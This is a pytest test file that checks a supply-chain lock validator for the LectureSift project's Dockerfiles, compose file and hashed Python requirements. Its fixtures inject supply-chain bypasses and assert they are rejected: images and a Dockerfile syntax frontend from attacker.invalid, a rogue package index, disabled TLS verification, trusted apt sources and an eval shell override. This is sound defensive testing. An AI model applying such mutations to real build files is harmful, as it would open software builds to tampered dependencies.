from __future__ import annotations

import hashlib
import importlib.util
from pathlib import Path
import re
import shutil

import pytest


ROOT = Path(__file__).resolve().parents[1]


def _module():
    spec = importlib.util.spec_from_file_location(
        "lecturesift_supply_chain_lock", ROOT / "deploy" / "supply_chain_lock.py"
    )
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _copy_contract(tmp_path: Path) -> Path:
    for relative in (
        "Dockerfile",
        "compose.yaml",
        "requirements.txt",
        "requirements.lock",
        "requirements-dev.txt",
        "deploy/supply_chain.lock",
        "deploy/egress-proxy/Dockerfile",
    ):
        destination = tmp_path / relative
        destination.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(ROOT / relative, destination)
    return tmp_path


def _replace_manifest_value(root: Path, key: str, value: str) -> None:
    path = root / "deploy" / "supply_chain.lock"
    lines = path.read_text(encoding="utf-8").splitlines()
    path.write_text(
        "\n".join(value if line.startswith(f"{key}=") else line for line in lines) + "\n",
        encoding="utf-8",
    )


def test_supply_chain_manifest_matches_pinned_sources_and_hashed_lock():
    module = _module()

    digest = module.validate(ROOT)

    assert digest == hashlib.sha256((ROOT / "deploy/supply_chain.lock").read_bytes()).hexdigest()
    dockerfile = (ROOT / "Dockerfile").read_text(encoding="utf-8")
    proxy = (ROOT / "deploy/egress-proxy/Dockerfile").read_text(encoding="utf-8")
    assert dockerfile.startswith("FROM python:3.12-slim@sha256:")
    assert proxy.startswith("FROM debian:bookworm-slim@sha256:")
    assert "pip install --no-cache-dir --require-hashes -r requirements.lock" in dockerfile
    assert "COPY requirements.txt requirements.lock ./" in dockerfile
    assert "io.lecturesift.supply-chain-lock-sha256" in dockerfile
    assert "io.lecturesift.supply-chain-lock-sha256" in proxy


def test_proxy_bootstraps_ca_from_locked_image_and_uses_https_only():
    proxy = (ROOT / "deploy/egress-proxy/Dockerfile").read_text(encoding="utf-8")
    manifest = dict(
        line.split("=", 1)
        for line in (ROOT / "deploy/supply_chain.lock")
        .read_text(encoding="utf-8")
        .splitlines()
    )

    ca_path = "/etc/ssl/certs/ca-certificates.crt"
    ca_copy = f"COPY --from={manifest['application_base']} {ca_path} {ca_path}"
    update = "update --error-on=any;"
    install_proxy = (
        "install -y --no-install-recommends "
        "ca-certificates squid squidclient;"
    )

    assert ca_copy in proxy
    assert proxy.count("FROM ") == 1
    assert proxy.index(ca_copy) < proxy.index("RUN set -eux;")
    assert proxy.index("URIs: https://snapshot.debian.org") < proxy.index(update)
    assert proxy.index(update) < proxy.index(install_proxy)
    assert proxy.count("Acquire::https::CAInfo=" + ca_path) == 2
    assert "Acquire::https::Verify-Peer=true" in proxy
    assert "Acquire::https::Verify-Host=true" in proxy
    assert "test ! -L " + ca_path in proxy
    assert proxy.count(update) == 1
    assert proxy.count("rm -rf /var/lib/apt/lists/*") == 1
    assert "http://snapshot.debian.org" not in proxy
    assert "allow-insecure" not in proxy.lower()
    assert "trusted=yes" not in proxy.lower()


@pytest.mark.parametrize(
    "before,after",
    [
        (
            "COPY --from=python:3.12-slim@sha256:",
            "COPY --from=python:3.12-slim@sha256:0",
        ),
        (
            "Acquire::https::Verify-Peer=true",
            "Acquire::https::Verify-Peer=false",
        ),
        (
            "Acquire::https::Verify-Host=true",
            "Acquire::https::Verify-Host=false",
        ),
        (
            "update --error-on=any;",
            "update;",
        ),
        (
            "test -s /etc/ssl/certs/ca-certificates.crt;",
            "true;",
        ),
        (
            "https://snapshot.debian.org/archive/debian/",
            "http://snapshot.debian.org/archive/debian/",
        ),
        (
            "Acquire::https::CAInfo=/etc/ssl/certs/ca-certificates.crt",
            "Acquire::https::CAInfo=/tmp/unreviewed-ca.crt",
        ),
        (
            "'Check-Valid-Until: no' \\",
            "'Check-Valid-Until: no' 'Trusted: yes' \\",
        ),
    ],
)
def test_supply_chain_manifest_rejects_proxy_ca_bootstrap_drift(
    tmp_path, before, after
):
    module = _module()
    root = _copy_contract(tmp_path)
    proxy = root / "deploy" / "egress-proxy" / "Dockerfile"
    source = proxy.read_text(encoding="utf-8")
    assert before in source
    proxy.write_text(source.replace(before, after, 1), encoding="utf-8")

    with pytest.raises(module.SupplyChainError):
        module.validate(root)


def test_supply_chain_manifest_rejects_an_extra_proxy_ca_source(tmp_path):
    module = _module()
    root = _copy_contract(tmp_path)
    proxy = root / "deploy" / "egress-proxy" / "Dockerfile"
    source = proxy.read_text(encoding="utf-8")
    proxy.write_text(
        source
        + "\nCOPY --from=attacker.invalid/image:latest /ca.crt /tmp/ca.crt\n",
        encoding="utf-8",
    )

    with pytest.raises(module.SupplyChainError, match="proxy copy instructions"):
        module.validate(root)


@pytest.mark.parametrize(
    "injection",
    [
        "COPY ca-certificates.crt /etc/ssl/certs/",
        "COPY debian-archive-keyring.gpg /usr/share/keyrings/",
        "ADD ca-certificates.crt /etc/ssl/certs/",
        'COPY [\"ca-certificates.crt\", \"/etc/ssl/certs/\"]',
    ],
)
def test_supply_chain_manifest_rejects_local_trust_shadowing(tmp_path, injection):
    module = _module()
    root = _copy_contract(tmp_path)
    proxy = root / "deploy" / "egress-proxy" / "Dockerfile"
    source = proxy.read_text(encoding="utf-8")
    proxy.write_text(
        source.replace("RUN set -eux;", injection + "\n\nRUN set -eux;", 1),
        encoding="utf-8",
    )

    with pytest.raises(module.SupplyChainError, match="proxy copy instructions"):
        module.validate(root)


@pytest.mark.parametrize(
    "mutation",
    [
        lambda source: "# syntax=attacker.invalid/dockerfile:latest\n" + source,
        lambda source: "# escape=" + chr(96) + "\n" + source,
        lambda source: "# check=skip=all\n" + source,
        lambda source: source.replace(
            "RUN set -eux;",
            'SHELL ["/bin/sh", "-c", "eval \\"$0\\""]\n\nRUN set -eux;',
            1,
        ),
        lambda source: source.replace(
            "COPY squid.conf /etc/squid/squid.conf",
            "RUN /usr/bin/apt install -y curl\n\n"
            "COPY squid.conf /etc/squid/squid.conf",
            1,
        ),
        lambda source: source.replace(
            "RUN set -eux;",
            "ENV APT_CONFIG=/tmp/unreviewed-apt.conf\n\nRUN set -eux;",
            1,
        ),
    ],
)
def test_supply_chain_manifest_rejects_proxy_instruction_semantic_bypasses(
    tmp_path, mutation
):
    module = _module()
    root = _copy_contract(tmp_path)
    proxy = root / "deploy" / "egress-proxy" / "Dockerfile"
    source = proxy.read_text(encoding="utf-8")
    changed = mutation(source)
    assert changed != source
    proxy.write_text(changed, encoding="utf-8")

    with pytest.raises(module.SupplyChainError):
        module.validate(root)


def test_supply_chain_manifest_rejects_a_late_proxy_ca_copy(tmp_path):
    module = _module()
    root = _copy_contract(tmp_path)
    proxy = root / "deploy" / "egress-proxy" / "Dockerfile"
    source = proxy.read_text(encoding="utf-8")
    copy_line = next(
        line for line in source.splitlines() if line.startswith("COPY --from=")
    )
    proxy.write_text(
        source.replace(copy_line + "\n", "", 1) + "\n" + copy_line + "\n",
        encoding="utf-8",
    )

    with pytest.raises(module.SupplyChainError, match="copied too late"):
        module.validate(root)


def test_proxy_ca_copy_is_bound_to_a_changed_valid_application_digest(tmp_path):
    module = _module()
    root = _copy_contract(tmp_path)
    replacement = "python:3.12-slim@sha256:" + "a" * 64
    manifest = root / "deploy" / "supply_chain.lock"
    manifest_source = manifest.read_text(encoding="utf-8")
    current = re.search(r"^application_base=(.+)$", manifest_source, re.MULTILINE).group(1)
    manifest.write_text(
        manifest_source.replace(
            f"application_base={current}", f"application_base={replacement}", 1
        ),
        encoding="utf-8",
    )
    dockerfile = root / "Dockerfile"
    dockerfile.write_text(
        dockerfile.read_text(encoding="utf-8").replace(
            f"FROM {current}", f"FROM {replacement}", 1
        ),
        encoding="utf-8",
    )

    with pytest.raises(module.SupplyChainError, match="proxy copy instructions"):
        module.validate(root)


def test_supply_chain_manifest_requires_fail_closed_apt_update(tmp_path):
    module = _module()
    root = _copy_contract(tmp_path)
    dockerfile = root / "Dockerfile"
    source = dockerfile.read_text(encoding="utf-8")
    assert "apt-get update --error-on=any;" in source
    dockerfile.write_text(
        source.replace("apt-get update --error-on=any;", "apt-get update;", 1),
        encoding="utf-8",
    )

    with pytest.raises(module.SupplyChainError, match="locked command"):
        module.validate(root)


@pytest.mark.parametrize(
    "injection",
    [
        "# syntax=attacker.invalid/dockerfile:latest\n",
        'SHELL ["/bin/sh", "-c"]\n',
    ],
)
def test_application_dockerfile_rejects_unlocked_execution_semantics(
    tmp_path, injection
):
    module = _module()
    root = _copy_contract(tmp_path)
    dockerfile = root / "Dockerfile"
    source = dockerfile.read_text(encoding="utf-8")
    dockerfile.write_text(injection + source, encoding="utf-8")

    with pytest.raises(module.SupplyChainError):
        module.validate(root)


def test_ci_rebuilds_and_smokes_the_locked_proxy_without_cache():
    workflow = (ROOT / ".github/workflows/test.yml").read_text(encoding="utf-8")

    assert "python3 deploy/supply_chain_lock.py --root ." in workflow
    assert "docker build --pull --no-cache --platform linux/amd64" in workflow
    assert "lecturesift-egress-proxy:ci" in workflow
    assert "docker run --rm --network none" in workflow
    assert "dpkg-query -W ca-certificates squid squidclient" in workflow


def test_supply_chain_requirement_digests_are_line_ending_stable(tmp_path):
    module = _module()
    root = _copy_contract(tmp_path)
    for relative in ("requirements.txt", "requirements.lock", "requirements-dev.txt"):
        path = root / relative
        canonical = path.read_bytes().replace(b"\r\n", b"\n")
        path.write_bytes(canonical.replace(b"\n", b"\r\n"))

    module.validate(root)

    root = _copy_contract(tmp_path / "mixed")
    source = root / "requirements.txt"
    canonical = source.read_bytes().replace(b"\r\n", b"\n")
    source.write_bytes(canonical.replace(b"\n", b"\r\n", 1))

    module.validate(root)


def test_supply_chain_requirement_digests_reject_lone_carriage_returns(tmp_path):
    module = _module()
    root = _copy_contract(tmp_path)
    source = root / "requirements.txt"
    source.write_bytes(source.read_bytes().replace(b"\r\n", b"\n") + b"\r")

    with pytest.raises(module.SupplyChainError, match="lone carriage return"):
        module.validate(root)


def test_supply_chain_manifest_fails_closed_on_stale_or_unhashed_inputs(tmp_path):
    module = _module()
    root = _copy_contract(tmp_path)

    (root / "requirements.txt").write_text("fastapi==0.116.1\n# drift\n", encoding="utf-8")
    with pytest.raises(module.SupplyChainError, match="without regenerating"):
        module.validate(root)

    root = _copy_contract(tmp_path / "unhashed")
    lock = root / "requirements.lock"
    lock.write_text("fastapi==0.116.1\n", encoding="utf-8")
    lock_digest = hashlib.sha256(lock.read_bytes()).hexdigest()
    _replace_manifest_value(root, "requirements_lock_sha256", f"requirements_lock_sha256={lock_digest}")
    with pytest.raises(module.SupplyChainError, match="fully pinned and hashed"):
        module.validate(root)


def test_supply_chain_manifest_binds_fully_hashed_development_requirements(tmp_path):
    module = _module()
    root = _copy_contract(tmp_path)
    dev = root / "requirements-dev.txt"
    dev.write_text(
        dev.read_text(encoding="utf-8").replace(
            "pytest==9.1.1 \\\n", "pytest==9.1.1\n", 1
        ),
        encoding="utf-8",
    )
    digest = hashlib.sha256(dev.read_bytes()).hexdigest()
    _replace_manifest_value(
        root, "requirements_dev_sha256", f"requirements_dev_sha256={digest}"
    )

    with pytest.raises(module.SupplyChainError, match="fully pinned and hashed"):
        module.validate(root)


def test_supply_chain_manifest_rejects_platform_markers_in_production_lock(tmp_path):
    module = _module()
    root = _copy_contract(tmp_path)
    lock = root / "requirements.lock"
    lock.write_text(
        lock.read_text(encoding="utf-8").replace(
            "amqp==5.3.1 \\\n",
            'amqp==5.3.1; sys_platform == "win32" \\\n',
            1,
        ),
        encoding="utf-8",
    )
    digest = hashlib.sha256(lock.read_bytes()).hexdigest()
    _replace_manifest_value(
        root, "requirements_lock_sha256", f"requirements_lock_sha256={digest}"
    )

    with pytest.raises(module.SupplyChainError):
        module.validate(root)


def test_supply_chain_manifest_rejects_non_colorama_development_markers(tmp_path):
    module = _module()
    root = _copy_contract(tmp_path)
    dev = root / "requirements-dev.txt"
    dev.write_text(
        dev.read_text(encoding="utf-8").replace(
            "pytest==9.1.1 \\\n",
            'pytest==9.1.1; sys_platform == "win32" \\\n',
            1,
        ),
        encoding="utf-8",
    )
    digest = hashlib.sha256(dev.read_bytes()).hexdigest()
    _replace_manifest_value(
        root, "requirements_dev_sha256", f"requirements_dev_sha256={digest}"
    )

    with pytest.raises(module.SupplyChainError):
        module.validate(root)


@pytest.mark.parametrize(
    "replacement",
    [
        "-r requirements.txt",
        "-r requirements.lock\n-r requirements.lock",
        "--extra-index-url https://attacker.invalid/simple",
        'colorama==0.4.6; sys_platform != "win32" \\\n'
        "    --hash=sha256:4f1d9991f5acc0ca119f9d443620b77f9d6b33703e51011c16baf57afb285fc6",
    ],
)
def test_supply_chain_manifest_rejects_unreviewed_development_requirement_syntax(
    tmp_path, replacement
):
    module = _module()
    root = _copy_contract(tmp_path)
    dev = root / "requirements-dev.txt"
    source = dev.read_text(encoding="utf-8")
    if replacement.startswith("colorama"):
        source = re.sub(
            r'colorama==0\.4\.6; sys_platform == "win32" \\\n'
            r"    --hash=sha256:[0-9a-f]{64}",
            replacement,
            source,
            count=1,
        )
    else:
        source = source.replace("-r requirements.lock", replacement, 1)
    dev.write_text(source, encoding="utf-8")
    digest = hashlib.sha256(dev.read_bytes()).hexdigest()
    _replace_manifest_value(
        root, "requirements_dev_sha256", f"requirements_dev_sha256={digest}"
    )

    with pytest.raises(module.SupplyChainError):
        module.validate(root)


def test_supply_chain_manifest_rejects_mutable_base_and_runtime_images(tmp_path):
    module = _module()
    root = _copy_contract(tmp_path)
    manifest = root / "deploy/supply_chain.lock"
    manifest.write_text(
        manifest.read_text(encoding="utf-8").replace(
            "application_base=python:3.12-slim@sha256:",
            "application_base=python:3.12-slim#",
            1,
        ),
        encoding="utf-8",
    )
    with pytest.raises(module.SupplyChainError, match="not immutable"):
        module.validate(root)

    root = _copy_contract(tmp_path / "runtime")
    compose = root / "compose.yaml"
    compose.write_text(
        re.sub(r"image: redis:7\.4-alpine@sha256:[0-9a-f]{64}", "image: redis:7.4-alpine", compose.read_text(encoding="utf-8")),
        encoding="utf-8",
    )
    with pytest.raises(module.SupplyChainError, match="runtime image does not match"):
        module.validate(root)


@pytest.mark.parametrize("directive", ["from", "FrOm", "\tFROM"])
def test_supply_chain_manifest_counts_from_case_insensitively(tmp_path, directive):
    module = _module()
    root = _copy_contract(tmp_path)
    dockerfile = root / "Dockerfile"
    dockerfile.write_text(
        dockerfile.read_text(encoding="utf-8")
        + f"\n{directive} attacker.invalid/unreviewed:latest\n",
        encoding="utf-8",
    )

    with pytest.raises(module.SupplyChainError, match="exactly one base image"):
        module.validate(root)


@pytest.mark.parametrize(
    "injection",
    [
        "RUN printf 'deb https://attacker.invalid stable main\\n' > /etc/apt/sources.list.d/evil.list\n",
        "RUN printf 'deb https://snapshot.debian.org/archive/debian/20260828T000000Z stable main\\n' >> /etc/apt/sources.list.d/debian.sources\n",
        "RUN sed -i 's/trixie/stable/g' /etc/apt/sources.list.d/debian.sources\n",
        "RUN apt-get update; apt-get install -y curl\n",
    ],
)
def test_supply_chain_manifest_rejects_extra_or_rewritten_apt_sources(tmp_path, injection):
    module = _module()
    root = _copy_contract(tmp_path)
    dockerfile = root / "Dockerfile"
    dockerfile.write_text(
        dockerfile.read_text(encoding="utf-8") + "\n" + injection,
        encoding="utf-8",
    )

    with pytest.raises(module.SupplyChainError):
        module.validate(root)


def test_supply_chain_manifest_rejects_extra_command_inside_apt_provisioning(tmp_path):
    module = _module()
    root = _copy_contract(tmp_path)
    dockerfile = root / "Dockerfile"
    dockerfile.write_text(
        dockerfile.read_text(encoding="utf-8").replace(
            "    apt-get update --error-on=any; \\\n",
            "    printf unreviewed-command >/tmp/source-state; "
            "apt-get update --error-on=any; \\\n",
            1,
        ),
        encoding="utf-8",
    )

    with pytest.raises(module.SupplyChainError, match="locked command"):
        module.validate(root)


@pytest.mark.parametrize(
    "replacement",
    [
        "image: redis:7.4-alpine\n    # {locked}",
        "{locked}\n    image: redis:7.4-alpine",
        "<<: *app\n    {locked}",
        "{{ image: redis:7.4-alpine }}\n    # {locked}",
    ],
)
def test_supply_chain_manifest_rejects_compose_comment_duplicate_merge_and_flow_bypasses(
    tmp_path, replacement
):
    module = _module()
    root = _copy_contract(tmp_path)
    compose = root / "compose.yaml"
    source = compose.read_text(encoding="utf-8")
    locked = re.search(
        r"image: redis:7\.4-alpine@sha256:[0-9a-f]{64}", source
    ).group(0)
    compose.write_text(
        source.replace(locked, replacement.format(locked=locked), 1),
        encoding="utf-8",
    )

    with pytest.raises(module.SupplyChainError):
        module.validate(root)


def test_supply_chain_manifest_rejects_duplicate_services_and_unexpected_images(tmp_path):
    module = _module()
    root = _copy_contract(tmp_path)
    compose = root / "compose.yaml"
    source = compose.read_text(encoding="utf-8")
    compose.write_text(
        source.replace(
            "  redis:\n",
            "  redis:\n    image: attacker.invalid/redis:latest\n  redis:\n",
            1,
        ),
        encoding="utf-8",
    )

    with pytest.raises(module.SupplyChainError):
        module.validate(root)


def test_every_privileged_runtime_image_reference_is_content_addressed():
    mutable = re.compile(r"(?:postgres:18-bookworm|redis:7\.4-alpine|caddy:2-alpine)(?!@sha256:)")
    checked = [ROOT / "compose.yaml", *(ROOT / "deploy").glob("*.sh")]
    failures = [str(path.relative_to(ROOT)) for path in checked if mutable.search(path.read_text(encoding="utf-8"))]
    assert failures == []


def test_release_and_rehearsal_admission_bind_the_supply_chain_digest():
    release = (ROOT / "deploy/release.sh").read_text(encoding="utf-8")
    stage = (ROOT / "deploy/stage_release_candidate.sh").read_text(encoding="utf-8")
    exact = (ROOT / "deploy/run_exact_rehearsal.sh").read_text(encoding="utf-8")
    admission = (ROOT / "deploy/validate_rehearsal_admission.py").read_text(encoding="utf-8")
    for source in (release, stage, exact):
        assert "supply_chain_lock.py" in source
        assert "LECTURESIFT_SUPPLY_CHAIN_LOCK_SHA256" in source
        assert "io.lecturesift.supply-chain-lock-sha256" in source
    assert "supply_chain_lock.py" in admission
    assert "supply_chain_digest" in admission
    assert "io.lecturesift.supply-chain-lock-sha256" in admission
    assert "LECTURESIFT_SUPPLY_CHAIN_LOCK_SHA256=" in admission
